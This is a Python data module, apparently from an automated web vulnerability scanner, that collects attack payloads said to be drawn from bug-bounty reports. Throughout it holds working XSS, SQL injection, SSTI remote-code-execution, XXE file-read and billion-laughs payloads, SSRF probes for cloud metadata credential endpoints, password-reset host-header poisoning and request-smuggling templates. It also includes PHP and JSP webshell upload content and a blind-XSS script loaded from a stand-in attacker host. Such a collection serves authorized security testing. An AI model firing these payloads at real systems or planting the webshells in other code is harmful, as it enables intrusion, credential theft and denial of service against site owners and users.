"""
Attack Pattern Library — compiled from 5700+ real bug bounty reports.
Provides tech-specific payloads, endpoint patterns, and success indicators
derived from the Sai-RT.csv dataset and public bug bounty writeups.
"""

# ── CORS ──────────────────────────────────────────────────────────────────────
# Source: 1050 CORS reports in dataset; top bug class
CORS_ATTACK_ORIGINS = [
    "null",                           # null origin bypass (file:// / sandboxed iframe)
    "https://evil.example.com",       # basic reflected-origin test
    "https://notexample.com",         # partial-match bypass (if allowlist checks prefix)
    "https://example.com.evil.com",   # suffix-match bypass
    "https://subdomain.{target}",     # trusted-subdomain if ACAO reflects all subdomains
]

CORS_SENSITIVE_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/api/v1/me", "/api/v1/user", "/account/settings",
    "/graphql", "/api/graphql", "/gql",
]

# ── CSRF ──────────────────────────────────────────────────────────────────────
# Source: 660 CSRF reports; SameSite bypass and missing token checks
CSRF_SENSITIVE_ACTIONS = [
    "/account/email/change", "/account/password/change", "/account/delete",
    "/api/user/email", "/api/user/password", "/api/user/delete",
    "/settings/email", "/settings/password", "/settings/delete",
    "/profile/update", "/profile/email", "/user/settings",
    "/api/account/close", "/api/account/transfer",
    "/logout", "/api/logout",  # login CSRF
]

CSRF_BYPASS_HEADERS = {
    "Content-Type": "text/plain",  # bypass JSON-only CSRF protection
    "X-Requested-With": "",        # remove AJAX header requirement
}

# ── XSS ───────────────────────────────────────────────────────────────────────
# Source: 611 stored XSS, 183 reflected XSS, 124 blind XSS, 40 DOM XSS reports
XSS_PAYLOADS = [
    # Basic (often blocked)
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",

    # Event handlers (bypass tag filters)
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(1)>",
    "<body onresize=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",

    # Attribute injection
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",

    # WAF bypass (from XSS case study in dataset)
    "<ScRiPt>alert(1)</ScRiPt>",
    "<%2fscript>alert(1)<%2fscript>",
    "<svg><script>alert(1)</script>",
    "<math><mtext></math><script>alert(1)</script>",
    "<iframe src='javascript:alert(1)'>",
    "javascript:alert(1)",

    # Blind XSS (exfil to webhook)
    "<script src=https://attacker.example.com/xss.js></script>",

    # Template-context payloads (SSTI bleed)
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
]

XSS_TEST_PARAMS = [
    "q", "s", "search", "query", "input", "text", "message",
    "name", "username", "title", "comment", "description",
    "redirect", "url", "next", "return", "callback",
    "error", "msg", "info", "success", "status",
]

# ── SQL INJECTION ──────────────────────────────────────────────────────────────
# Source: 9 direct SQLi + many auth bypass via SQLi in dataset
SQLI_ERROR_PAYLOADS = ["'", '"', "1'", "1\"", "''", "\\", "--", "1 OR 1=1--"]

SQLI_TIME_PAYLOADS = [
    "1; SELECT SLEEP(4)--",
    "1' AND SLEEP(4)--",
    "1 AND SLEEP(4)--",
    "1'; SELECT SLEEP(4)--",
    "1' AND pg_sleep(4)--",
    "1; WAITFOR DELAY '0:0:4'--",
    "1' AND (SELECT 4 FROM (SELECT SLEEP(4))x)--",
]

SQLI_ERROR_PATTERNS = [
    "sql syntax", "mysql_fetch", "syntax error", "unclosed quotation",
    "ora-", "pg_query", "sqlite_", "unterminated string",
    "invalid input syntax", "division by zero", "sqlstate",
    "db2 sql error", "microsoft jet database",
]

SQLI_TEST_PARAMS = [
    "id", "user_id", "order_id", "item_id", "product_id", "cat", "category",
    "search", "q", "query", "filter", "sort", "page", "limit",
    "username", "email", "login", "user", "name",
]

# ── SSRF ───────────────────────────────────────────────────────────────────────
# Source: 79 SSRF + 18 blind SSRF reports in dataset
SSRF_PARAMS = [
    "url", "uri", "endpoint", "redirect", "next", "path", "dest",
    "destination", "target", "src", "href", "callback", "fetch", "load",
    "proxy", "image", "file", "link", "imageUrl", "image_url",
    "fileUrl", "file_url", "returnUrl", "return_url", "apiUrl", "api_url",
    "webhook", "webhookUrl", "webhook_url", "pingback", "notify",
    "host", "server", "remote", "resource", "data",
]

SSRF_TARGETS = [
    # AWS IMDSv1 — most common in dataset (AWS: 433 mentions)
    # Indicators must be specific strings that only appear in real metadata responses
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "security-credentials", "local-hostname"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey", "Token"]),
    ("http://169.254.169.254/latest/user-data", ["#!/bin/bash", "cloud-init", "runcmd:", "#cloud-config"]),
    # AWS IPv6 bypass
    ("http://[fd00:ec2::254]/latest/meta-data/", ["ami-id", "instance-id", "local-hostname"]),
    # GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/instance/", ["computeMetadata", "service-accounts", "project-id"]),
    # Azure IMDS
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["subscriptionId", "resourceGroupName", "osProfile"]),
    # Internal services — highly specific response indicators only
    ("http://localhost:6379/", ["+PONG", "-ERR", "*1\r\n"]),
    ("http://localhost:9200/", ["\"cluster_name\"", "\"version\":{", "\"tagline\""]),
    ("http://localhost:2375/containers/json", ["\"NetworkSettings\"", "\"HostConfig\"", "\"Mounts\""]),
    ("http://localhost:4040/api/tunnels", ["\"public_url\"", "\"proto\":\"https\"", "\"tunnels\""]),
    ("http://127.0.0.1:8080/actuator/health", ["\"status\":\"UP\"", "\"diskSpace\"", "\"ping\""]),
    ("http://127.0.0.1:3000/", ["\"grafana\"", "Kibana", "Prometheus"]),
]

SSRF_BYPASS_ENCODINGS = [
    "http://0177.0.0.1/",          # octal IP
    "http://2130706433/",           # decimal IP for 127.0.0.1
    "http://[::1]/",                # IPv6 localhost
    "http://127.1/",                # short-form
    "http://0x7f000001/",           # hex IP
]

# ── IDOR ───────────────────────────────────────────────────────────────────────
# Source: 1854 IDOR reports — top vulnerability in dataset
IDOR_ID_PARAMS = [
    "id", "user_id", "userId", "account_id", "accountId",
    "order_id", "orderId", "invoice_id", "invoiceId",
    "file_id", "fileId", "document_id", "documentId",
    "ticket_id", "ticketId", "report_id", "reportId",
    "org_id", "orgId", "team_id", "teamId", "group_id", "groupId",
    "profile_id", "profileId", "customer_id", "customerId",
    "transaction_id", "transactionId", "payment_id", "paymentId",
    "subscription_id", "subscriptionId", "plan_id", "planId",
    "project_id", "projectId", "workspace_id", "workspaceId",
    "record_id", "recordId", "object_id", "objectId",
]

IDOR_ENDPOINT_PATTERNS = [
    r"/api/users?/\d+",
    r"/api/accounts?/\d+",
    r"/api/orders?/\d+",
    r"/api/profiles?/\d+",
    r"/api/invoices?/\d+",
    r"/api/tickets?/\d+",
    r"/api/files?/\d+",
    r"/api/documents?/\d+",
    r"/users?/\d+",
    r"/accounts?/\d+",
]

# ── PRIVILEGE ESCALATION ───────────────────────────────────────────────────────
# Source: 276 privilege escalation reports in dataset
PRIV_ESC_PARAMS = [
    # Role/permission parameters to inject into request bodies
    {"role": "admin"},
    {"role": "administrator"},
    {"role": "superuser"},
    {"is_admin": True},
    {"is_admin": "true"},
    {"is_admin": 1},
    {"admin": True},
    {"admin": "true"},
    {"admin": 1},
    {"isAdmin": True},
    {"isAdmin": "true"},
    {"permission": "admin"},
    {"permissions": ["admin", "read", "write"]},
    {"scope": "admin"},
    {"group": "admin"},
    {"user_type": "admin"},
    {"userType": "ADMIN"},
    {"access_level": 9999},
    {"accessLevel": 9999},
    {"privilege": "admin"},
    {"level": 100},
    {"tier": "enterprise"},
    {"plan": "enterprise"},
    {"subscription": "premium"},
    {"verified": True},
    {"email_verified": True},
    {"approved": True},
]

PRIV_ESC_ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/users", "/admin/dashboard",
    "/admin/settings", "/admin/config", "/admin/reports",
    "/api/admin", "/api/admin/users", "/api/admin/settings",
    "/api/internal", "/api/internal/users",
    "/management", "/manage", "/superuser",
    "/console", "/debug", "/actuator",
    "/actuator/env", "/actuator/beans", "/actuator/mappings",
    "/.env", "/.git/config", "/.git/HEAD",
    "/config.json", "/config.yaml", "/settings.json",
    "/phpinfo.php", "/info.php", "/server-status",
    "/wp-admin", "/wp-login.php", "/wordpress/wp-admin",
]

# ── ACCOUNT TAKEOVER ───────────────────────────────────────────────────────────
# Source: 167 ATO + 168 open redirect + OAuth/JWT chains in dataset
ATO_PASSWORD_RESET_TESTS = [
    # Host header injection in password reset email
    {"Host": "attacker.example.com"},
    {"X-Forwarded-Host": "attacker.example.com"},
    {"X-Host": "attacker.example.com"},
    {"X-Original-URL": "https://attacker.example.com"},
    {"X-Rewrite-URL": "https://attacker.example.com"},
]

ATO_RESET_ENDPOINTS = [
    "/forgot-password", "/forgot_password", "/forgotpassword",
    "/reset-password", "/reset_password", "/resetpassword",
    "/password/reset", "/password/forgot", "/password/new",
    "/api/password/reset", "/api/forgot-password",
    "/auth/forgot-password", "/auth/reset-password",
    "/users/password/new", "/accounts/password/reset",
]

ATO_EMAIL_CHANGE_ENDPOINTS = [
    "/account/email", "/settings/email", "/profile/email",
    "/api/account/email", "/api/user/email", "/api/profile/email",
    "/user/settings/email", "/account/settings/email",
]

# ── CORS MISCONFIGURATION ─────────────────────────────────────────────────────
# Source: 1050 CORS reports — tests for ACAO wildcard + credentials, reflected origin
CORS_CHECKS = {
    "wildcard_with_credentials": {
        "description": "Access-Control-Allow-Origin: * with Allow-Credentials: true",
        "severity": "high",
    },
    "reflected_origin": {
        "description": "Origin header is reflected back in ACAO without allowlist validation",
        "severity": "high",
    },
    "null_origin": {
        "description": "null Origin is allowed — exploitable via sandboxed iframe",
        "severity": "high",
    },
    "subdomain_wildcard": {
        "description": "Any subdomain of the target is trusted",
        "severity": "medium",
    },
    "prefix_bypass": {
        "description": "CORS origin allowlist uses prefix match, bypassable with attacker.target.com",
        "severity": "high",
    },
}

# ── CACHE POISONING ────────────────────────────────────────────────────────────
# Source: 104 cache poisoning reports; CloudFront: 120 mentions in dataset
CACHE_POISON_HEADERS = [
    # Unkeyed headers that affect response but aren't in cache key
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "Forwarded",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Override-URL",
    # Port-based
    "X-Forwarded-Port",
    # Protocol-based
    "X-Forwarded-Proto",
    # Fat GET (body parameters ignored in cache key)
    "X-HTTP-Method-Override",
]

CACHE_POISON_VALUES = [
    "evil.example.com",
    "attacker.com",
    "evil.com",
]

# ── REQUEST SMUGGLING ─────────────────────────────────────────────────────────
# From writeups dataset: Apple $36k, Akamai $46k
REQUEST_SMUGGLING_PAYLOADS = {
    "cl_te": (
        "POST / HTTP/1.1\r\n"
        "Host: {target}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\n"
        "X"
    ),
    "te_cl": (
        "POST / HTTP/1.1\r\n"
        "Host: {target}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 3\r\n\r\n"
        "1\r\n"
        "A\r\n"
        "0\r\n\r\n"
    ),
}

# ── RACE CONDITIONS ────────────────────────────────────────────────────────────
# Source: 39 race condition reports — coupon abuse, balance transfer, double-spend
RACE_CONDITION_ENDPOINTS = [
    "/api/coupon/apply", "/api/promo/apply", "/api/voucher/redeem",
    "/api/gift/redeem", "/api/code/apply",
    "/api/transfer", "/api/payment", "/api/purchase",
    "/api/withdraw", "/api/refund",
    "/api/vote", "/api/like", "/api/follow",
    "/api/subscribe", "/api/trial/start",
    "/checkout", "/checkout/complete",
]

# ── BUSINESS LOGIC ─────────────────────────────────────────────────────────────
# Source: 51 business logic + 32 coupon abuse reports
BUSINESS_LOGIC_TESTS = [
    # Negative quantities/prices
    {"field": "quantity", "value": -1},
    {"field": "amount", "value": -1},
    {"field": "price", "value": -0.01},
    {"field": "total", "value": -100},
    # Integer overflow
    {"field": "quantity", "value": 9999999999},
    {"field": "amount", "value": 2147483648},
    # Zero
    {"field": "price", "value": 0},
    {"field": "amount", "value": 0},
]

# ── GRAPHQL ────────────────────────────────────────────────────────────────────
# Source: 175 GraphQL reports in dataset; top Amazon internal service
GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/gql", "/query",
    "/graph", "/v1/graphql", "/v2/graphql",
    "/graphql/v1", "/graphql/v2",
    "/prod/graphql", "/freight/ql",  # from dataset endpoint patterns
    "/a9g-api-gateway/graphql",
]

GRAPHQL_INTROSPECTION = '{"query":"{__schema{types{name fields{name}}}}"}'
GRAPHQL_BATCH = '[{"query":"{__typename}"},{"query":"{__typename}"}]'
GRAPHQL_AUTH_BYPASS_QUERIES = [
    '{"query":"{ users { id email password } }"}',
    '{"query":"{ allUsers { id email role } }"}',
    '{"query":"{ admin { id email } }"}',
]

# Raw GraphQL query text (NOT pre-JSON-wrapped — caller does
# json.dumps({"query": ...}) — a deep, manually-escaped JSON literal like
# GRAPHQL_INTROSPECTION above would be error-prone at this nesting depth).
# Unlike GRAPHQL_INTROSPECTION (which only fetches type/field NAMES), this
# also requests each field's ARGUMENTS (2 levels of ofType unwrapping covers
# the common NonNull(List(String)) wrapping depths) — the real schema-driven
# testing in _module_graphql_deep needs to know what a query/mutation
# actually accepts, which the shallow introspection query can't see.
GRAPHQL_FULL_INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        args {
          name
          type {
            name
            kind
            ofType { name kind ofType { name kind } }
          }
        }
        type {
          name
          kind
          ofType { name kind ofType { name kind } }
        }
      }
    }
  }
}
""".strip()

# Object-shaped NoSQL operator payloads to try as a GraphQL variable's value
# (same operator shapes _module_nosql already uses against REST JSON bodies).
# A spec-compliant server rejects these with a type-coercion error before
# reaching any resolver — the caller must check for GRAPHQL_TYPE_ERROR_MARKERS
# and skip that case rather than flag it.
GRAPHQL_NOSQL_VARIABLE_PAYLOADS = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
]
GRAPHQL_TYPE_ERROR_MARKERS = [
    "expected type", "got invalid value", "cannot represent",
    "must be a", "of type", "variable \"$",
]

# ── JWT ────────────────────────────────────────────────────────────────────────
# Source: 60 JWT reports + analysis from writeups
JWT_WEAK_SECRETS = [
    "secret", "password", "admin", "key", "test", "123456",
    "changeme", "jwt_secret", "your-256-bit-secret", "supersecret",
    "mysecret", "private", "app_secret", "api_key", "passw0rd",
    "qwerty", "12345678", "letmein", "master", "dev",
    "development", "staging", "production", "token",
    "", "null", "none", "undefined",
]

JWT_KID_PAYLOADS = [
    "../../dev/null",
    "/dev/null",
    "../../etc/passwd",
    "| cat /etc/passwd",
    "../../../tmp/evil.key",
]

# ── OPEN REDIRECT ─────────────────────────────────────────────────────────────
# Source: 168 open redirect reports; common chain to ATO via OAuth
REDIRECT_PARAMS = [
    "url", "redirect", "redirect_uri", "redirect_url", "redirectTo",
    "next", "return", "returnUrl", "return_url", "returnTo",
    "goto", "dest", "destination", "link", "to", "ref",
    "rurl", "target", "forward", "continue", "from",
    "successUrl", "success_url", "failUrl", "fail_url",
    "callbackUrl", "callback_url", "callback",
    "login_hint", "state",  # OAuth params
]

REDIRECT_PAYLOADS = [
    "https://evil.example.com",
    "//evil.example.com",
    "\\\\evil.example.com",
    "/\\evil.example.com",
    "https:evil.example.com",
    "\r\nevil.example.com",
    "%0d%0aLocation:evil.example.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

# ── TECH FINGERPRINTING ────────────────────────────────────────────────────────
# Maps response signals to likely vulnerability patterns
TECH_SIGNATURES = {
    "spring": {
        "signals": ["X-Application-Context", "Whitelabel Error Page", "Spring Boot"],
        "prioritize": ["actuator", "ssrf", "xxe", "sqli"],
        "paths": ["/actuator", "/actuator/health", "/actuator/env", "/actuator/beans"],
    },
    "django": {
        "signals": ["csrfmiddlewaretoken", "Django", "WSGI/Django"],
        "prioritize": ["sqli", "ssti", "csrf", "idor"],
        "paths": ["/admin/", "/django-admin/"],
    },
    "rails": {
        "signals": ["X-Runtime", "X-Request-Id", "Ruby on Rails"],
        "prioritize": ["mass_assignment", "sqli", "idor"],
        "paths": ["/rails/info", "/rails/mailers"],
    },
    "laravel": {
        "signals": ["laravel_session", "XSRF-TOKEN", "Laravel"],
        "prioritize": ["sqli", "xss", "csrf", "idor"],
        "paths": ["/api/user", "/sanctum/csrf-cookie"],
    },
    "graphql": {
        "signals": ["application/graphql", "__schema", "GraphQL"],
        "prioritize": ["graphql", "idor", "auth_bypass"],
        "paths": ["/graphql", "/gql", "/api/graphql"],
    },
    "aws": {
        "signals": ["x-amz-request-id", "x-amz-id-2", "AmazonS3", "CloudFront"],
        "prioritize": ["ssrf", "cors", "cache_poisoning", "s3_takeover"],
        "paths": [],
    },
    "wordpress": {
        "signals": ["wp-content", "wp-includes", "WordPress"],
        "prioritize": ["xss", "sqli", "auth_bypass"],
        "paths": ["/wp-admin/", "/wp-login.php", "/xmlrpc.php"],
    },
    "fastapi": {
        "signals": ["FastAPI", "/openapi.json", "/docs", "/redoc"],
        "prioritize": ["idor", "mass_assignment", "jwt", "ssrf"],
        "paths": ["/openapi.json", "/docs", "/redoc", "/api/v1/"],
    },
    "express": {
        "signals": ["Express", "X-Powered-By: Express"],
        "prioritize": ["prototype_pollution", "idor", "cors", "ssrf"],
        "paths": ["/api/"],
    },
}

# ── REST API COMMON PATHS ─────────────────────────────────────────────────────
# Probed unauthenticated to find exposed data, IDOR, and mass-assignment vectors
REST_API_PATHS = [
    # User/auth endpoints
    "/api/Users", "/api/users", "/api/v1/users", "/api/v2/users",
    "/api/Accounts", "/api/accounts", "/api/members",
    # Product/content
    "/api/Products", "/api/products", "/api/items", "/api/catalog",
    # Orders/payments
    "/api/Orders", "/api/orders", "/api/Baskets", "/api/baskets",
    "/api/basket/1", "/api/Basket/1", "/rest/basket/1",
    # Feedback/reviews
    "/api/Feedbacks", "/api/feedbacks", "/api/reviews", "/api/Comments",
    # Internal REST APIs common in Node/Express apps
    "/rest/user/whoami", "/rest/user/login",
    "/rest/products/search", "/rest/basket/1",
    # Admin APIs
    "/api/admin/users", "/api/v1/admin", "/api/internal/users",
]

# ── PROMETHEUS / MONITORING PATHS ─────────────────────────────────────────────
MONITORING_PATHS = [
    ("/metrics", ["process_cpu", "http_request", "nodejs_", "go_goroutines", "# HELP", "# TYPE"]),
    ("/actuator/metrics", ["measurements", "availableTags", "name"]),
    ("/actuator/env", ["propertySources", "activeProfiles", "systemProperties"]),
    ("/actuator/beans", ["beans", "scope", "dependencies"]),
    ("/actuator/mappings", ["dispatcherServlets", "requestMappingConditions"]),
    ("/debug/vars", ["cmdline", "memstats", "goroutine"]),
    ("/server-status", ["Apache Server Status", "Total Accesses", "Uptime"]),
]

# ── CORS WILDCARD ─────────────────────────────────────────────────────────────
# Sensitive API paths to probe for wildcard CORS (allows any origin to read response)
CORS_WILDCARD_API_PATHS = [
    "/api/Users", "/api/users", "/api/Products", "/api/products",
    "/api/Orders", "/api/orders", "/api/Feedbacks",
    "/rest/user/whoami", "/rest/products/search",
    "/api/v1/users", "/api/v1/me", "/api/me", "/api/user",
]

# ── SQLI REST API ENDPOINTS ────────────────────────────────────────────────────
# Common REST API endpoints that accept query params or JSON bodies vulnerable to SQLi
SQLI_REST_ENDPOINTS = [
    # GET endpoints with query params
    ("/rest/products/search", "q"),
    ("/api/products/search", "q"),
    ("/api/search", "q"),
    ("/search", "q"),
    ("/api/users/search", "q"),
    ("/api/items/search", "q"),
]

# ── IDOR REST API PATTERNS ────────────────────────────────────────────────────
# Authenticated REST endpoints to probe for IDOR (try IDs 1-5)
IDOR_REST_PATHS = [
    "/api/Users/{id}", "/api/users/{id}",
    "/api/Baskets/{id}", "/api/baskets/{id}", "/rest/basket/{id}",
    "/api/Orders/{id}", "/api/orders/{id}",
    "/api/Products/{id}", "/api/products/{id}",
    "/api/Feedbacks/{id}", "/api/feedbacks/{id}",
    "/api/v1/users/{id}", "/api/v1/orders/{id}",
]

# ── MASS ASSIGNMENT VECTORS ───────────────────────────────────────────────────
# POST/PATCH body fields that may escalate privileges or bypass business
# rules via mass assignment / BOPLA (Broken Object Property Level
# Authorization — the 2023 OWASP API Top 10's merge of the old "Excessive
# Data Exposure" + "Mass Assignment" categories: the server silently applies
# a property the client was never supposed to be able to set).
#
# Merged from what used to be two separately-defined MASS_ASSIGNMENT_ROLE_FIELDS
# lists in this file — the second one silently shadowed the first (same name,
# later assignment wins in Python), so the first list's variants
# (admin:True, userType/type:admin, privilege/access_level) were completely
# dead code, never actually tested. Found via a 2026-09-15 audit. Also
# widened beyond role/admin fields specifically to cover the broader BOPLA
# pattern research flagged as a common, high-value real-world gap: business
# fields a server should compute/validate itself (price, balance, discount,
# verification status) but might instead accept directly from client input.
MASS_ASSIGNMENT_ROLE_FIELDS = [
    {"role": "admin"},
    {"role": "administrator"},
    {"isAdmin": True},
    {"is_admin": True},
    {"admin": True},
    {"userType": "admin"},
    {"type": "admin"},
    {"privilege": 1},
    {"access_level": 99},
    {"roles": ["admin"]},
    {"permissions": ["admin"]},
    {"tier": "premium"},
    {"subscription": "deluxe"},
    {"is_verified": True},
    {"verified": True},
    {"price": 0},
    {"balance": 999999},
    {"discount_percent": 100},
]

# ── COMMON SENSITIVE PATHS ────────────────────────────────────────────────────
COMMON_SENSITIVE_PATHS = [
    # Config & secrets
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/config.json", "/config.yaml", "/config.yml", "/settings.json",
    "/web.config", "/app.config", "/appsettings.json",
    "/docker-compose.yml", "/docker-compose.yaml",
    # Source control
    "/.git/config", "/.git/HEAD", "/.svn/entries",
    "/.github/workflows/", "/Makefile", "/Dockerfile",
    # API & docs
    "/swagger.json", "/swagger.yaml", "/openapi.json", "/openapi.yaml",
    "/api-docs", "/api/docs", "/api/swagger",
    # Monitoring & debug
    "/actuator", "/actuator/env", "/actuator/health",
    "/_ah/admin", "/_ah/info", "/server-status", "/server-info",
    "/debug", "/debug/vars", "/debug/pprof",
    "/__debug__", "/__admin__",
    # Backup files
    "/backup.sql", "/dump.sql", "/database.sql",
    "/backup.zip", "/backup.tar.gz",
    # CMS
    "/wp-admin/", "/wp-login.php", "/xmlrpc.php",
    "/admin/", "/cms/", "/management/",
    # Cloud
    "/latest/meta-data/", "/computeMetadata/v1/",
]

# ── SSTI (Server-Side Template Injection) ────────────────────────────────────
SSTI_PAYLOADS = [
    "{{7*7}}",              # Jinja2/Twig — if output is 49, SSTI confirmed
    "${7*7}",               # Freemarker/EL
    "<%= 7*7 %>",           # ERB (Ruby)
    "#{7*7}",               # Ruby
    "{{7*'7'}}",            # Jinja2 — outputs 7777777, not 49
    "{{config}}",           # Jinja2 config dump
    "{{request.environ}}", # Jinja2 environment
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",  # Freemarker RCE
    "{{''.__class__.__mro__[2].__subclasses__()}}",  # Jinja2 subclasses
    "*{7*7}",               # Spring Expression Language (SpEL)
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",  # Twig RCE
]

SSTI_INDICATORS = [
    "49",          # 7*7 math result — only valid if we injected the payload
    "7777777",     # Jinja2 string multiply
    "root:",       # /etc/passwd via RCE
    "uid=",        # `id` command output
]

SSTI_TEST_FIELDS = [
    "name", "title", "message", "comment", "subject", "description",
    "feedback", "body", "content", "text", "template", "email",
]

# ── NoSQL Injection ────────────────────────────────────────────────────────────
NOSQL_INJECTION_PAYLOADS = [
    # MongoDB operator injection via JSON body
    {"$gt": ""},           # always true in MongoDB
    {"$ne": None},         # not-equal null — matches all
    {"$regex": ".*"},      # regex wildcard
    {"$where": "1==1"},    # JavaScript injection
]

NOSQL_URL_PAYLOADS = [
    # URL param injection for MongoDB
    "[$gt]=",
    "[$ne]=invalid",
    "[$regex]=.*",
    "[%24gt]=",
]

NOSQL_REST_ENDPOINTS = [
    # Endpoints known to use NoSQL / accept operator injection
    ("/rest/products/search", "q"),
    ("/api/search", "q"),
    ("/api/users/search", "q"),
    ("/api/products/search", "q"),
]

NOSQL_SLEEP_PAYLOADS = [
    # NoSQL DoS via $where JavaScript sleep
    '{"$where": "function(){var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date<5000); return Math.max();}"}',
    '0;var date=new Date(); var curDate=null; do{ curDate=new Date(); } while(curDate-date<5000)',
]

# ── XXE (XML External Entity) ─────────────────────────────────────────────────
XXE_PAYLOADS = [
    # Classic XXE — read /etc/passwd
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",

    # Classic XXE — read Windows system.ini
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini">]>
<foo>&xxe;</foo>""",

    # XXE OOB (out-of-band) via parameter entity
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]>
<foo>test</foo>""",

    # XXE DoS — billion laughs
    """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>""",

    # SVG XXE (for file upload endpoints)
    """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>""",
]

XXE_INDICATORS = [
    "root:", "/bin/bash", "/sbin/nologin",  # /etc/passwd
    "[boot loader]", "for 16-bit app support",  # Windows system.ini
    "ami-id", "instance-id",  # AWS metadata
    "lol",  # billion laughs echo
]

XXE_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/x-www-form-urlencoded",  # XML in body
]

# ── File Upload ────────────────────────────────────────────────────────────────
# Source: Upload vulnerabilities common in Juice Shop + real bugs
FILE_UPLOAD_PATHS = [
    "/file-upload", "/api/file-upload", "/upload", "/api/upload",
    "/api/v1/upload", "/import", "/api/import",
    "/profile/image", "/api/profile/image",
    "/api/users/photo", "/photo-wall",
]

FILE_UPLOAD_BYPASS_EXTENSIONS = [
    # Extension bypass payloads (for servers that check extension not content-type)
    ".php%00.jpg",    # null byte truncation
    ".php\x00.jpg",   # null byte binary
    ".php5",          # alternative PHP extension
    ".phtml",
    ".jsp",
    ".jspx",
    ".asp",
    ".aspx",
    ".shtml",
    ".shtm",
    ".cgi",
    ".cfm",          # ColdFusion
]

FILE_UPLOAD_MALICIOUS_CONTENT = {
    "php": b"<?php system($_GET['cmd']); ?>",
    "jsp": b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
    "svg_xxe": b'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>',
    "zip_slip": None,  # generated dynamically
    "billion_laughs": b'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>',
}

# ── Information Disclosure ─────────────────────────────────────────────────────
# FTP / backup / source / config file paths
INFO_DISCLOSURE_PATHS = [
    # Juice Shop specific
    "/ftp", "/ftp/", "/ftp/acquisitions.md",
    "/ftp/package.json.bak",
    "/ftp/coupons_2013.md.bak",
    "/ftp/legal.md",
    "/ftp/eastere.gg",
    "/ftp/suspicious_errors.yml",
    # Common backup / forgotten files
    "/backup", "/backup/", "/.backup",
    "/db.sql", "/database.sql", "/dump.sql", "/backup.sql",
    "/config.bak", "/web.config.bak",
    "/package.json", "/package-lock.json", "/yarn.lock",
    "/composer.json", "/composer.lock",
    "/Gemfile", "/Gemfile.lock",
    "/requirements.txt", "/Pipfile",
    "/Makefile", "/Dockerfile", "/docker-compose.yml",
    "/nginx.conf", "/apache2.conf", "/.htaccess", "/.htpasswd",
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
    "/.svn/entries", "/.DS_Store",
    "/robots.txt", "/sitemap.xml",
    "/.well-known/security.txt",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    # Source code disclosure
    "/index.php.bak", "/index.php~",
    "/application.py.bak", "/app.py.bak",
    "/server.js.bak", "/app.js.bak",
    # Log files
    "/access.log", "/error.log", "/app.log",
    "/logs/access.log", "/logs/error.log",
    "/var/log/nginx/access.log",
    # IDE/editor files
    "/.idea/workspace.xml", "/.vscode/settings.json",
]

INFO_DISCLOSURE_INDICATORS = {
    "/ftp": ["acquisitions", "package.json", "legal", "coupons", "eastere"],
    "/.env": ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL", "REDIS_URL"],
    "/.git/config": ["[core]", "repositoryformatversion", "filemode"],
    "/package.json": ['"name"', '"version"', '"dependencies"'],
    "/.htpasswd": ["$apr1$", ":{SHA}", "$2y$"],
    "/access.log": ["GET /", "POST /", "HTTP/1.1", "200", "404"],
    "/robots.txt": ["Disallow:", "Allow:", "User-agent:"],
    "/.well-known/security.txt": ["Contact:", "Encryption:", "Acknowledgments:"],
}

